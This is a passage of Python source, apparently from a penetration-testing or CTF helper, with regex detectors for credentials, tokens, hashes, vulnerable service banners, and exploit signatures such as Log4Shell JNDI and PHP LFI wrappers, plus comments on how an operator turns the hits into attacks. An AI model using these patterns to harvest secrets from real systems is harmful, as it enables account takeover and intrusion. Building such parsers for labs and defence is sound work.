    # AD custom-attr cleartext-or-b64 password (HTB Cascade cascadeLegacyPwd
    # style). Match attribute names ending in -Pwd/-Password/-Pass and decode
    # a base64-or-text value.
    ("AD custom-attr b64 password", re.compile(
        r'(?im)^\s*([a-z][\w\-]*(?:Pwd|Password|Pass))\s*:\s*([A-Za-z0-9+/=]{8,200})\s*$')),
    # netsh wlan show profile key=clear console output: 'Key Content: <psk>'
    ("netsh wlan Key Content", re.compile(
        r'(?im)^[ \t]*Key\s+Content[ \t]*:[ \t]*([^\r\n]{8,63})[ \t]*$')),
    # wlan profile XML: <keyMaterial>X</keyMaterial>
    ("wlan keyMaterial XML", re.compile(
        r'(?is)<keyMaterial>\s*([^<\s][^<]{6,62})\s*</keyMaterial>')),
    # ---- iter-10: container / CI / cloud loot detectors ----
    # Vault unseal key (HashiCorp Vault `vault operator init` output): one of N
    # base64 keys you need M-of-N to unseal. Distinctive shape: 'Unseal Key N:'
    # followed by a base64 token (44 chars for default Shamir).
    ("Vault unseal key", re.compile(
        r'(?i)\bUnseal\s+Key\s+\d+\s*:\s*([A-Za-z0-9+/=]{40,60})')),
    # Vault root token: `Initial Root Token: hvs.<...>` or `s.<...>` (legacy)
    ("Vault root token", re.compile(
        r'(?i)\b(?:Initial\s+)?Root\s+Token\s*:\s*((?:hvs|hvb|s)\.[A-Za-z0-9_\-]{20,})')),
    # kubectl bearer-token leak in shell history / CI log:
    # `kubectl --token=eyJ...` or `kubectl --token eyJ...`
    ("kubectl --token", re.compile(
        r'(?i)\bkubectl\b[^\n]*?--token[=\s]+(eyJ[A-Za-z0-9_\-\.]{20,})')),
    # Helm values.yaml common secret keys (root-level only; nested handled by
    # the generic ASSIGNED-SECRETS pass). Specific shape avoids the 'key:'
    # context regex FP because values.yaml routinely has 'secret:' as a section
    # header (no value).
    ("Helm values secret", re.compile(
        r'(?im)^\s{0,4}(secretKey|adminPassword|rootPassword|sharedSecret|jwtSecret|encryptionKey)'
        r'\s*:\s*["\']?([^"\'\s#\r\n]{6,80})["\']?\s*$')),
    # S3 / GCS presigned URL with the AWSAccessKeyId + Signature query params.
    # Loot value: gives direct file access without further auth.
    ("S3 presigned URL", re.compile(
        r'https?://[^\s\'\"<>]+\?(?:[^\s\'\"<>]*&)?'
        r'(?:X-Amz-Signature|Signature)=([A-Fa-f0-9%]{20,})')),
    # Azure DevOps PAT (52 base64 chars with no '+' or '/'). Shape distinctive.
    # The `pat=`/`AZURE_DEVOPS_TOKEN=` context is in the SaaS rule; this catches
    # the bare blob shape too.
    ("Azure DevOps PAT", re.compile(
        r'(?i)\b(?:devops|azdo|ado)[_-]?(?:pat|token)\s*[:=]\s*["\']?([a-z0-9]{52})["\']?')),
    # GitHub fine-grained PAT: `github_pat_` + 22 + `_` + 59 base62 chars
    # (already in patterns.py vendor list, but here as a contextual hit when
    # bound to a `gh auth login` / `git clone` line for chain-narrative).
    ("gh auth PAT", re.compile(
        r'(?i)\bgh\s+auth\s+login\s+(?:-h\s+\S+\s+)?--with-token\s+(\S{20,})')),
    # CircleCI personal token in `~/.circleci/cli.yml` or env
    ("CircleCI token", re.compile(
        r'(?i)\b(?:circleci_token|CIRCLE_TOKEN)\s*[:=]\s*["\']?([a-f0-9]{40})["\']?')),
    # Jenkins build env dump: `BUILD_USER_EMAIL=...`, `_JOB_PASSWORD=...`,
    # `_CRED_PASSWORD=...` - if a secret leaks here, it's plaintext.
    ("Jenkins build env secret", re.compile(
        r'(?im)^\s*\w*(?:JOB|BUILD|CRED|SCRIPT)_(?:PASSWORD|PASS|TOKEN|SECRET|KEY|API_KEY)'
        r'\s*=\s*([^\s\r\n]{6,200})\s*$')),
    # AWS shared-config profile with role_arn + source_profile (multi-account
    # pivot path). Distinctive 'role_arn = arn:aws:iam::...:role/...' line.
    ("AWS assume-role profile", re.compile(
        r'(?im)^\s*role_arn\s*=\s*(arn:aws:iam::\d{12}:role/[\w+=,.@/-]{1,80})\s*$')),
    # Terraform .tfvars secret line (var name typically ends in _password /
    # _secret / _key / _token).
    ("Terraform tfvars secret", re.compile(
        r'(?im)^\s*([A-Za-z][A-Za-z0-9_]*(?:_password|_secret|_key|_token|_pwd))\s*=\s*'
        r'["\']([^"\'\r\n]{6,200})["\']')),
    # Consul ACL token (UUID v4 shape) - common HashiCorp loot
    ("Consul ACL token", re.compile(
        r'(?i)\b(?:CONSUL_HTTP_TOKEN|consul_token|acl\.tokens\.\w+)\s*[:=]\s*["\']?'
        r'([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})["\']?')),
    # ---- iter-22: modern web exploit IOCs + service-banner CVEs (wwzwk72m3) ----
    # Log4Shell JNDI injection - direct + obfuscated nested forms. Captures
    # the literal `${jndi:` prefix (case-flex variants too).
    ("Log4Shell JNDI", re.compile(
        r'\$\{(?:\$?\{?(?:lower|upper|env|sys|date|jndi)[:}][^{}]*?)?'
        r'jndi:(?:ldap|ldaps|rmi|dns|nis|iiop|corba|nds|http)s?://')),
    # Spring4Shell (CVE-2022-22965) classLoader pipeline manipulation
    ("Spring4Shell classLoader", re.compile(
        r'class\.module\.classLoader\.resources\.context\.parent\.pipeline')),
    # Confluence OGNL injection (CVE-2022-26134)
    ("Confluence OGNL", re.compile(
        r'\$\{\(#a=@org\.apache\.commons\.io\.IOUtils@toString')),
    # ProxyShell autodiscover.json @-suffix SSRF (CVE-2021-34473)
    ("ProxyShell autodiscover", re.compile(
        r'/autodiscover/autodiscover\.json\?@[^/&\s]+(?:&|\?)Email=autodiscover')),
    # ProxyLogon X-AnonResource-Backend SSRF (CVE-2021-26855)
    ("ProxyLogon X-AnonResource", re.compile(
        r'(?i)X-AnonResource-Backend\s*:\s*\S+/ecp/')),
    # MOVEit human2.aspx webshell (CVE-2023-34362)
    ("MOVEit human2.aspx", re.compile(
        r'(?i)/human2\.aspx(?:\?|\s|HTTP)')),
    # TeamCity ;.jsp auth-bypass (CVE-2024-27198)
    ("TeamCity .jsp bypass", re.compile(
        r'(?i)/app/rest/[^\s\'"]+;\.jsp')),
    # NetScaler memory leak (CVE-2023-4966) NSC_AAAC cookie
    ("NetScaler NSC_AAAC", re.compile(
        r'\bNSC_AAAC\s*=\s*[A-Fa-f0-9]{60,}')),
    # F5 BIG-IP iControl REST Connection-header auth bypass (CVE-2022-1388)
    ("F5 BIG-IP iControl bypass", re.compile(
        r'(?i)Connection\s*:\s*[^\r\n]*X-F5-Auth-Token[^\r\n]*\r?\n[^\r\n]*X-F5-Auth-Token\s*:\s*0\b')),
    # GitLab pw-reset double-email (CVE-2023-7028) - array body marker
    ("GitLab pw-reset double-email", re.compile(
        r'user\[email\]\[\]\s*=\s*[^&\s]+@[^&\s]+&user\[email\]\[\]\s*=\s*')),
    # ---- iter-22 service-banner CVE markers ----
    # vsftpd 2.3.4 smiley backdoor (CVE-2011-2523) - distinctive banner in
    # nmap -sV / ftp greeting captures.
    ("vsftpd 2.3.4 backdoor", re.compile(
        r'(?i)\b(?:220\s+\(?vsFTPd\s+|vsftpd\s+)2\.3\.4\b')),
    # Samba 4.5.9+ SambaCry (CVE-2017-7494) - range 3.5.0-4.6.4 vulnerable
    ("Samba SambaCry banner", re.compile(
        r'(?i)Server\s*=\s*\[\s*Samba\s+(4\.[0-5]\.\d+|4\.6\.[0-4])[\.\-][\w.-]*\s*\]')),
    # Apache 2.4.49 / 2.4.50 path traversal + RCE (CVE-2021-41773/42013)
    ("Apache 2.4.49/50 traversal", re.compile(
        r'(?i)\bApache/2\.4\.(49|50)\b')),
    # HFS 2.3 RejettoHFS RCE (CVE-2014-6287)
    ("HFS 2.3 RCE banner", re.compile(
        r'(?i)\bHttpFileServer\s+2\.3[\w.-]*')),
    # Drupalgeddon2 (CVE-2018-7600) - Drupal 7.x or 8.x version banner
    ("Drupal pre-7.59/8.5.1", re.compile(
        r'(?i)\bDrupal\s+(?:7\.(?:[0-9]|[1-5][0-9])|8\.[0-4](?:\.\d+)?|8\.5\.0)\b')),
    # ---- iter-21: Tier-2 from corpus mine wwzwk72m3 ----
    # GetUserSPNs default text-table recon row (TryHackMe Attacking Kerberos).
    # Header is: ServicePrincipalName Name MemberOf PasswordLastSet LastLogon
    # Each data row has SPN + Name + (MemberOf, with CN= which has '=' not in \w)
    # + ISO timestamps. Use looser MemberOf charset.
    ("GetUserSPNs CSV row", re.compile(
        r'(?m)^([a-zA-Z][\w/\-.]{3,80})\s+([a-zA-Z][\w$.\-]{2,40})\s+'
        r'([A-Z][\w =,.\-]{2,200}?)\s+\d{4}-\d{2}-\d{2}\s+\d{2}:\d{2}:\d{2}')),
    # smbmap -R recursive listing - per-file row inside a share walk.
    # Format: `<perms> <size> <DOW> <Mon> <Day> <HH:MM:SS> <YYYY> <name>`
    # Catch sensitive-named files (passwords/creds/backups/keys).
    ("smbmap -R sensitive file", re.compile(
        r'(?im)^\s*[wfdr\-]+\s+\d+\s+\w{3}\s+\w{3}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2}\s+\d{4}\s+'
        r'([^\r\n]*?(?:passwd|password|users?\.txt|backup|cred|secret|'
        r'unattend|\.kdbx|\.pfx|\.p12|\.kirbi|\.ccache|id_rsa|\.bak|'
        r'groups\.xml|web\.config|\.config|\.keytab)[^\r\n]*?)\s*$')),
    # ---- iter-20: Tier-1 from corpus mine wwzwk72m3 ----
    # Elastix / FreePBX amportal.conf AMPDBPASS / AMPMGRPASS / AMPMYSQL_PASS
    # (HTB Beep / lab-style PBX boxes - typical foothold → root reuse pattern)
    ("Elastix AMPDBPASS", re.compile(
        r'(?im)^\s*AMP(?:DBPASS|MGRPASS|MYSQL_PASS)\s*=\s*([^\s#\r\n]{3,80})')),
    # PHP bracketed-array secret: $cfg['db_password'] = 'X'  /
    # $cfg['DB_PASSWORD']="X"  (vtigercrm / Roundcube / Sentinel-style).
    # Different from the existing 'PHP array secret' rule (fat-arrow '=>').
    # iter-30: added 'controlpass' (phpMyAdmin config.inc.php), 'ftppass'
    # (nextcloud / cPanel), and 'adminpass' (moodle / kirby CMS).
    ("PHP bracketed array secret", re.compile(
        r"(?i)\[\s*['\"](?:db_)?(?:password|passwd|pwd|controlpass|"
        r"ftppass|adminpass|secret|salt|smtppass|api_?key|token)"
        r"['\"]\s*\]"
        r"\s*=\s*['\"]([^'\"\r\n]{3,200})['\"]")),
    # Tomcat context.xml Resource auth (Catalina DataSource with inline pw).
    # `<Resource name="..." username="X" password="Y" .../>` - whitespace flexible.
    ("Tomcat context Resource", re.compile(
        r'(?is)<Resource\b[^>]*?\busername\s*=\s*["\']([^"\']{1,40})["\']'
        r'[^>]*?\bpassword\s*=\s*["\']([^"\']{3,200})["\']')),
    # Tomcat server.xml Connector keystorePass / truststorePass (cert key pw)
    ("Tomcat keystorePass", re.compile(
        r'(?i)\b(?:keystorePass|truststorePass|SSLPassword)\s*=\s*["\']([^"\'\r\n]{3,80})["\']')),
    # IPSec pre-shared key XML element (pfSense config.xml / strongSwan dump)
    ("IPSec pre-shared-key", re.compile(
        r'(?is)<pre-shared-key>([^<\r\n]{6,200})</pre-shared-key>')),
    # NFS showmount -e export listing (TryHackMe Linux PrivEsc / KIOPTRIX-style).
    # `/srv/nfs  *` or `/opt/share  10.0.0.0/24` - no_root_squash on its own line.
    ("showmount -e export", re.compile(
        r'(?m)^(/[\w./\-]+)\s+(\*|[\d./]+(?:[,\s][\d./]+)*)\s*$')),
    # AccessChk -uwcqv service block per-service header (Windows PrivEsc)
    # `RW SERVICE_NAME` indented under "<service>" group line.
    ("accesschk service block", re.compile(
        r'(?im)^[ \t]*RW\s+[A-Z][A-Za-z0-9_$.]{2,40}\s*$')),
    # Web.config encrypted connectionStrings + machineKey (machineKey already
    # caught; here we also flag the encrypted-block marker so the operator
    # knows to grab aspnet_regiis -pdf for offline decrypt).
    ("ASP.NET encrypted config", re.compile(
        r'(?is)<EncryptedData\s+[^>]*\bType\s*=\s*["\']https?://www\.w3\.org/2001/04/xmlenc#Element["\']')),
    # AutoLogon DefaultUserName + DefaultDomainName (binds with existing
    # AutoLogon password rule via filename - emits separately so the operator
    # gets domain/user as Evidence too).
    ("AutoLogon DefaultUser", re.compile(
        r'(?i)(?:"?Default(?:UserName|DomainName)"?)\s*(?:["=:]+|\s+REG_SZ\s+)\s*["\']?([^"\'\r\n]{1,80})')),
    # ---- iter-18: pypykatz / impacket / Snaffler / NXC blocks (corpus mine wkl2kkzn5) ----
    # Kerberos AES key (gMSA/secretsdump aes256/aes128/des-cbc-md5).
    # Pass-the-Key primitive: getTGT.py -aesKey <key>.
    ("Kerberos AES key", re.compile(
        r'(?im)^(?P<who>[A-Za-z0-9._$\-]{1,64})\$?:'
        r'(?P<etype>aes(?P<bits>128|256)-cts-hmac-sha1-96|des-cbc-md5):'
        r'(?P<key>[a-f0-9]{16,128})\s*$')),
    # secretsdump $MACHINE.ACC computer NT hash (silver-ticket primitive)
    ("$MACHINE.ACC NT hash", re.compile(
        r'(?im)^(?P<dom>[A-Za-z0-9._\-]+)\\(?P<host>[A-Za-z0-9._\-]{1,40}\$):'
        r'(?P<lm>aad3b435b51404eeaad3b435b51404ee):(?P<nt>[a-f0-9]{32}):::\s*$')),
    # pypykatz Kerberos AES key line (etype + 32/64 hex)
    ("pypykatz Kerberos AES key", re.compile(
        r'(?im)^[ \t]*(aes(?:128|256))-cts-hmac-sha1-96\s*:\s*([a-f0-9]{32,64})\s*$')),
    # NetExec --rid-brute SidTypeUser output (single-line)
    ("nxc rid-brute user", re.compile(
        r'^(?:SMB|LSARPC|WINRM|LDAP)\s+\d{1,3}(?:\.\d{1,3}){3}\s+\d{1,5}\s+\S+\s+'
        r'(\d{3,7}):\s*([^\\\s]+)\\([^\s()]+)\s+\(SidType(User|Group|Alias|WellKnownGroup|Domain)\)')),
    # iter-124: impacket-lookupsid single-line output (no SMB/IP prefix)
    #   500: LAB\Administrator (SidTypeUser)
    # Same shape as nxc rid-brute, minus the ncacn header. Feeds users.txt
    # + spray candidates when the operator has null/guest LSARPC access.
    ("impacket-lookupsid user", re.compile(
        r'^\s*(\d{3,7}):\s*([^\\\s]+)\\([^\s()]+)\s+\(SidType(User|Group|Alias|WellKnownGroup|Domain)\)\s*$',
        re.MULTILINE)),
    # iter-125: impacket-lookupsid announces the domain SID prefix as:
    #   [*] Domain SID is: S-1-5-21-100-200-300-400
    # This seeds store.domain_sid() so R-GOLDEN/R-SILVER ticketer emit a
    # real -domain-sid instead of the '<S-1-5-21-...>' placeholder. Also
    # covers 'Domain Sid:' variants from bloodyAD / rpcclient lsaquery.
    ("impacket-lookupsid domain SID", re.compile(
        r'(?i)^\s*(?:\[\*\]\s+)?Domain\s+SID(?:\s+is)?\s*:\s*(S-1-5-21-\d+-\d+-\d+)\s*$',
        re.MULTILINE)),
    # Rubeus dump 'Base64EncodedTicket :' label (header-only; b64 follows)
    ("Rubeus dump ticket", re.compile(
        r'(?im)^\s*Base64EncodedTicket\s*:\s*$')),
    # Snaffler annotated (FileResult)[File] {Color}<rule|R|kB|mtime|path> format
    ("Snaffler annotated", re.compile(
        r'\((?:FileResult|RwStatusResult|ShareResult|DirResult)\)'
        r'\[(?:File|Share|Dir|RwStatus)\]\s+'
        r'\{(Black|Red|Yellow|Green)\}'
        r'<([A-Za-z][A-Za-z0-9]+)\|[^|]*\|[^|]*\|[^|]*\|'
        r'(\\\\[^>|]+|[A-Za-z]:\\[^>|]+|/[^>|]+)>'
        r'(?:\(([^\r\n]{0,400})\))?')),
    # Snaffler (ShareResult)[Share] simpler form
    ("Snaffler share", re.compile(
        r'\(ShareResult\)\[Share\]\s*\{(?:Red|Black|Yellow|Green)\}<[A-Z]\|'
        r'(\\\\[^\s>\\]+\\[^\s>]+)>')),
    # ---- iter-17: deep-corpus-mine gaps (workflow wkl2kkzn5) ----
    # sudo -l output line (distinct from /etc/sudoers - no user/host prefix):
    #     (root) NOPASSWD: /usr/bin/find
    # Triple-CRITICAL gap in the mine: missed every PEAS / linPEAS / sudo-l
    # cap in HTB Lame/Nibbles/THM Common-Linux-Privesc etc.
    # iter-166: two fixes to prior sudo -l pattern:
    #   1. leading whitespace optional (some sudo-l pastes are unindented).
    #   2. accept sudoedit as command (no leading /) since sudoedit doesn't
    #      require an absolute path in sudoers, and sudoedit /etc/shadow /
    #      sudoedit /root/... is an instant root read primitive.
    ("sudo -l NOPASSWD", re.compile(
        r'(?im)^\s*\(([^)\r\n]{1,80})\)\s+(?:NOPASSWD|SETENV)\s*:\s*'
        r'((?:/\S|sudoedit\b)[^\r\n]{0,200})')),
    # HTB Lame / smbclient / enum4linux Samba banner (CVE-2007-2447 range):
    #     Server=[Samba 3.0.20-Debian]
    ("Samba vuln banner", re.compile(
        r'(?i)Server\s*=\s*\[\s*Samba\s+(3\.0\.(?:[0-9]|1[0-9]|2[0-5])'
        r'(?:[.\-][\w.-]*)?)\s*\]')),
    # HTB Blocky-style Java/C#/JS typed field secret:
    #     public String sqlPass = "FakeBlockyPass2024!";
    ("Java field secret", re.compile(
        r'(?:public|private|protected|static|final|var|let|const|String|str)\s+'
        r'(?:public|private|protected|static|final|String|str|var|let|const|\s)*'
        r'([A-Za-z_]\w*(?:Pass|Password|Passwd|Pwd|Passphrase|Secret))\s*=\s*'
        r'["\']([^"\'\r\n]{3,})["\']', re.IGNORECASE)),
    # linPEAS bracketed-CVE line: `[+] [CVE-2021-4034] PwnKit`
    # Existing PEAS finding regex required unbracketed CVE token.
    ("PEAS bracketed CVE", re.compile(
        r'(?i)\[(?:[+!*])\]\s+\[?CVE-\d{4}-\d{2,7}\]?[^\r\n]{0,200}')),
    # Flask / itsdangerous session cookie (.eJw... zlib-prefix shape)
    ("Flask itsdangerous", re.compile(
        r'(?:^|[\s=;\'"])'
        r'(\.eJ[A-Za-z0-9_\-]{15,}\.[A-Za-z0-9_\-]{6,12}\.[A-Za-z0-9_\-]{20,})'
        r'(?=[\s;\'"]|$)')),
    # nmap NSE smb-vuln-* / ProFTPd CPFR/CPTO are multi-line - handled in
    # _multiline_passes() below (per-line _AD loop can't see across lines).
    # Steghide info / extract output (rijndael fingerprint is unique)
    ("Steghide artifact", re.compile(
        r'(?im)^\s*encrypted\s*:\s*rijndael-(?:128|192|256),\s*(?:cbc|ecb)\b')),
    # PHP wrapper LFI URL (php://filter/convert.base64-encode/resource=...)
    ("PHP wrapper LFI", re.compile(
        r'(?i)\b(?:php://(?:filter|input|expect)/[^\s\'"<>]{1,300}|'
        r'expect://[^\s\'"<>]{1,80}|phar://[^\s\'"<>]{1,200}|'
        r'data://text/plain(?:;base64)?,[^\s\'"<>]{1,300})')),
]


def _value_ok(value, line):
    cv = value.strip().strip("'\"")
    if len(cv) < 3 or len(cv) > 200:
        return False
    if filters.is_placeholder(value) or filters.is_known_example(value):
        return False
    if filters.is_code_not_literal(value, line):
        return False
    return True


# netexec / crackmapexec text-log service line:  PROTO  IP  PORT  HOSTNAME  [..]
# we learn host<->service so chains target the REAL ip (not <DC-IP>); the cred on
# the same line is still owned by credline below (we fall through, never claim).
_NXC_SVC = re.compile(r'^(SMB|WINRM|LDAPS?|MSSQL|SSH|FTP|RDP|WMI|NFS|VNC)\s+'
                      r'(\d{1,3}(?:\.\d{1,3}){3})\s+(\d{1,5})\s+(\S+)')
_NXC_PROTO = {"smb": "smb", "winrm": "winrm", "ldap": "ldap", "ldaps": "ldaps",
              "mssql": "mssql", "ssh": "ssh", "ftp": "ftp", "rdp": "rdp",
              "wmi": "smb", "nfs": "nfs", "vnc": "vnc"}


def _learn_nxc_service(line, path, store, seen):
    m = _NXC_SVC.match(line)
    if not m:
        return
    proto = m.group(1).lower()
    svc = _NXC_PROTO.get(proto, proto)
    ip, port, hostname = m.group(2), int(m.group(3)), m.group(4)
    key = (svc, ip)
    if key in seen:
        return
    seen.add(key)
    from analyzers.ingest.evidence import Evidence
    if hostname and hostname[0].isalnum():
        store.learn_host(ip=ip, names=[hostname])
    store.add(Evidence(kind="service", host=ip, port=port, service=svc, source=path))
    if svc in ("ldap", "ldaps"):     # LDAP exposed -> Domain Controller
        store.add(Evidence(kind="host", host=ip, fact="dc", source=path))


_SCCM_NAA_MULTI = re.compile(
    r'(?i)NetworkAccess(?:Account|Username)\s*[:=]\s*(\S+)[\s\S]{0,400}?'
    r'NetworkAccessPassword\s*[:=]\s*([^\r\n]{3,80})'
)

# iter-184: CIFS credentials file (/etc/cifs.creds, /etc/samba/*.creds,
# /root/.smbcreds, /etc/mount.cifs.creds). Referenced by mount.cifs -o
# credentials=<path>. The file is a simple 2- or 3-line trio:
#   username=alice
#   password=Sunfl0wer!
#   domain=CORP        (optional)
# The keys are also spelt user/pass/dom (short form) in some distros.
# Only fire in _multiline_passes() AND only on file paths that look like
# a CIFS creds file (filename gate applied at dispatch).
_CIFS_CREDS = re.compile(
    r'(?im)^\s*(?:username|user)\s*=\s*([^\s#\r\n]{1,60})\s*(?:#[^\r\n]*)?\s*\n'
    r'[\s\S]{0,200}?'
    r'^\s*(?:password|pass|pw)\s*=\s*([^\s#\r\n]{3,80})'
    r'(?:[\s\S]{0,200}?^\s*(?:domain|dom|workgroup)\s*=\s*([^\s#\r\n]{1,60}))?'
)

# iter-188: OpenVPN .ovpn config with inline auth-user-pass block.
# Shape:
#   <auth-user-pass>
#   alice
#   Sunfl0wer!
#   </auth-user-pass>
# Sometimes a `-----BEGIN AUTH-----`/`-----END AUTH-----` marker instead
# of the XML-style tags. Both surface plaintext user + pw for VPN
# authentication - very common in lab boxes that ship a ready-to-use
# .ovpn with the operator's cred baked in.
_OVPN_AUTH = re.compile(
    r'(?i)<auth-user-pass>\s*\r?\n'
    r'([^\r\n<]{2,80})\s*\r?\n'
    r'([^\r\n<]{3,80})\s*\r?\n\s*'
    r'</auth-user-pass>'
)

# iter-188: JBoss/WildFly mgmt-users.properties / application-users.properties.
# The AS 7+ / WildFly management realm stores each user as
#   alice=b3f1e8b04c9d2f4e7a2f0c1d5e8b3f2a
# where the hex is HEX_MD5(username:realm:password) - hashcat mode 501.
# Default management realm is 'ManagementRealm'; default application realm
# is 'ApplicationRealm'. Very common on Jenkins/Confluence/Nexus boxes
# that share JBoss / WildFly infra. Filename-gated at dispatch to avoid
# matching generic `.properties` files.
_JBOSS_MGMT_USER = re.compile(
    r'(?m)^([a-zA-Z][a-zA-Z0-9._$-]{1,40})=([a-fA-F0-9]{32})\s*$'
)

# iter-190: .htpasswd - Apache basic-auth user:hash file. Hash flavors:
#   $apr1$salt$md5(md5crypt)     -> hashcat -m 1600
#   $2[aby]$rounds$saltandhash   -> bcrypt, -m 3200
#   {SHA}base64                  -> SHA-1, -m 100
#   {SSHA}base64                 -> salted SHA-1, -m 111
#   $y$/$5$/$6$                  -> yescrypt/sha256crypt/sha512crypt
# Bare plaintext form (some cheatsheets) is `user:cleartext` - we do NOT
# match that here because it would drown legit configs; that shape's
# already caught by the credline classifier when it appears in a real
# .htpasswd file (filename gate at dispatch).
_HTPASSWD_LINE = re.compile(
    r'(?m)^([A-Za-z_][A-Za-z0-9._-]{1,64}):'
    r'(\$apr1\$[./A-Za-z0-9]{1,8}\$[./A-Za-z0-9]{22}|'
    r'\$2[aby]\$\d\d\$[./A-Za-z0-9]{53}|'
    r'\{SHA\}[A-Za-z0-9+/=]{28}|'
    r'\{SSHA\}[A-Za-z0-9+/=]{32,}|'
    r'\$[y56]\$[^\s:]{20,}|'
    r'\$\d\$[./A-Za-z0-9]{1,16}\$[./A-Za-z0-9]{22,})\s*$'
)

# iter-198: Windows systeminfo output - `OS Name:` + `OS Version:` header.
# Multi-line: OS Name row + a few info rows + OS Version row.
_WINDOWS_SYSTEMINFO = re.compile(
    r'(?im)^\s*OS Name\s*:\s*(Microsoft[^\r\n]{5,80})\s*\r?\n'
    r'(?:[^\r\n]*\r?\n){0,4}'
    r'^\s*OS Version\s*:\s*(\d+\.\d+\.\d+)([^\r\n]{0,80})'
)

# iter-201: Grafana INI config admin creds. Standard grafana.ini shape:
#   [security]
#   admin_user = grafana-admin
#   admin_password = R3alP@ssw0rd
#   secret_key = X
# Detects the [security] section header + admin_user + admin_password rows.
# `admin_password = admin` is the DEFAULT (never rotated on stock installs)
# so we flag it CRITICAL even when it looks placeholder-ish.
_GRAFANA_ADMIN = re.compile(
    r'(?im)^\s*\[security\]\s*\r?\n'
    r'(?:(?!\n\s*\[)[\s\S]){0,400}?'
    r'^\s*admin_user\s*=\s*([^\s#\r\n]{1,60})\s*(?:#[^\r\n]*)?\s*\r?\n'
    r'(?:(?!\n\s*\[)[\s\S]){0,400}?'
    r'^\s*admin_password\s*=\s*([^\s#\r\n]{3,120})\s*(?:#[^\r\n]*)?\s*(?:\r?\n|$)'
)

# iter-201: Airflow airflow.cfg [core] sql_alchemy_conn - the metadata DB
# connection string. Contains DB user + password in URI form so we
# extract them:
#   [core]
#   sql_alchemy_conn = postgresql+psycopg2://airflow:R3alP@ss@postgres:5432/airflow
# The URL-with-creds regex in patterns.py catches these but we want a
# dedicated hit with the Airflow context for the report.
_AIRFLOW_CONN = re.compile(
    r'(?im)^\s*sql_alchemy_conn\s*=\s*'
    r'([a-z][a-z0-9+.\-]{2,20})://'
    r'([^:/@\s]+):([^@/\s]{3,80})@'
    r'([^:/\s]+)(?::(\d+))?'
    r'(?:/([^\s?#]+))?'
)

# iter-200: nmap NSE script VULNERABLE markers. Common shape from
# `nmap --script=smb-vuln* -p 445 <target>`:
#   | smb-vuln-ms17-010:
#   |   VULNERABLE:
#   |   Remote Code Execution vulnerability in Microsoft SMBv1 servers
#   |     State: VULNERABLE
#   |     IDs:  CVE:CVE-2017-0143
# Also rdp-vuln-ms12-020 for RDP DoS, and cve-2017-7494 SambaCry variant.
_NMAP_VULN_SCRIPT = re.compile(
    r'(?im)^\|\s*(smb-vuln-[a-z0-9\-]+|rdp-vuln-[a-z0-9\-]+|'
    r'cve-\d{4}-\d{4,7}|http-vuln-[a-z0-9\-]+|'
    r'ssl-poodle|ssl-heartbleed|ftp-vsftpd-backdoor|'
    r'ftp-proftpd-backdoor)\s*:\s*\n'
    r'\|\s*VULNERABLE:'
)

# iter-200: SMB signing not required (from `smb2-security-mode` or
# `smb-security-mode`). Signals SMB relay attacks are possible if we had
# the tools - but relay/coerce chains are OSCP+-BANNED, so this is intel
# only (flag as MEDIUM RECON with a compliance note).
_SMB_SIGNING_UNREQ = re.compile(
    r'(?im)(?:smb2?-security-mode|Message signing)[^\r\n]*\r?\n'
    r'(?:\|[^\r\n]*\r?\n){0,4}'
    r'\|[_\s]*Message signing enabled but not required'
)

# iter-199: OpenSSH banner. SSH-2.0 protocol identifier plus OpenSSH version.
# Common shapes:
#   SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u3
#   SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1
#   Banner grab / nmap script output: `ssh-hostkey: ... OpenSSH 7.4p1`
# Captures major/minor/patch/optional p<N> for range comparison. The pnum
# defaults to 0 when absent (so `8.4` == 8.4.0.0).
_OPENSSH_BANNER = re.compile(
    r'(?i)(?:SSH-2\.0-OpenSSH|OpenSSH)[_\s]+(\d+)\.(\d+)(?:p(\d+))?'
)

# iter-198: Sudo version banner (`sudo --version` / `sudo -V` output).
# Vulnerable to CVE-2021-3156 (Baron Samedit): 1.8.2 through 1.9.5p1
# inclusive - a decade of sudo builds. Also 1.9.5p2 fixed it.
_SUDO_VERSION = re.compile(
    r'(?im)^\s*Sudo\s+version\s+(\d+)\.(\d+)\.(\d+)(?:p(\d+))?\b'
)

# iter-197: Linux kernel version extraction. Covers:
#   `Linux <host> 5.4.0-42-generic #46-Ubuntu SMP ...`  (uname -a)
#   `Linux version 5.4.0-42-generic (gcc ...) #46 SMP ...`  (/proc/version)
#   `Kernel: Linux 5.4.0-42-generic`                     (hostnamectl)
#   `# Linux <ver>`                                       (/etc/issue)
# We match on `Linux[ version]? <MAJOR>.<MINOR>.<PATCH>[-buildinfo]` and
# capture MAJOR/MINOR/PATCH separately for range comparison.
_KERNEL_VERSION = re.compile(
    r'(?i)\bLinux(?:\s+version)?\s+'
    r'(?:\S+\s+)?'                     # optional hostname (uname -a)
    r'(\d{1,2})\.(\d{1,3})\.(\d{1,3})' # major.minor.patch
    r'(?:-\S+)?'                       # optional build tag
)

# iter-196: pfSense / OPNsense config.xml <user> blocks. The router config
# contains admin creds as bcrypt hashes:
#   <user>
#     <name>admin</name>
#     <descr><![CDATA[System Administrator]]></descr>
#     <scope>system</scope>
#     <bcrypt-hash>$2y$10$AbCd...</bcrypt-hash>
#     <password>$2y$10$AbCd...</password>
#     <uid>0</uid>
#   </user>
# We capture <name> + <bcrypt-hash> (or <password>) and feed the hash to
# HASHES with hashcat mode 3200 (bcrypt). Bleed-guarded so multiple <user>
# blocks don't cross-pair.
_PFSENSE_USER = re.compile(
    r'(?i)<user>\s*(?:<[^>]+>[^<]*</[^>]+>\s*)*?'
    r'<name>([^<>\r\n]{1,40})</name>'
    r'(?:(?!<user>)[\s\S]){0,600}?'
    r'<(?:bcrypt-hash|password)>(\$2[aby]\$\d\d\$[./A-Za-z0-9]{53})'
    r'</(?:bcrypt-hash|password)>'
)

# iter-196: .pypirc INI file - PyPI/TestPyPI upload credentials. Modern
# Twine uploads use API tokens (username=__token__, password=pypi-<token>).
# Multi-line: [section] header + username/password lines.
#   [pypi]
#   username = __token__
#   password = pypi-AgENdGVzdC5weXBpLm9yZ...
_PYPIRC_BLOCK = re.compile(
    r'(?im)^\s*\[(pypi|testpypi|[a-zA-Z0-9._-]{1,40})\]\s*\r?\n'
    r'(?:(?!\n\s*\[)[\s\S]){0,300}?'
    r'^\s*username\s*[:=]\s*([^\s#\r\n]{1,60})\s*\r?\n'
